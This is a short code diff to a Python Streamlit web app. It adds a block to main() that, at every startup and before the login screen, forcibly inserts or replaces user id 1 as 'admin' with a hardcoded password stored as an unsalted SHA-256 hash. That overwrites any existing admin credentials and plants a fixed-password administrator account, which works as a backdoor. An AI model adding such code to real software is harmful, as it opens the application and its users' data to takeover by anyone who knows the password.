@@ -370,6 +370,14 @@ def main():
     init_db()
     migrate_db()
 
+    # --- Force admin account ---
+    conn = get_db_connection()
+    c = conn.cursor()
+    admin_hash = hashlib.sha256("pa$$4Admin".encode()).hexdigest()
+    c.execute("INSERT OR REPLACE INTO users (id, username, password_hash) VALUES (1, 'admin', ?)", (admin_hash,))
+    conn.commit()
+    conn.close()
+
     # ---------- Login ----------
     if not st.session_state.authenticated:
         st.title("🔐 Login")
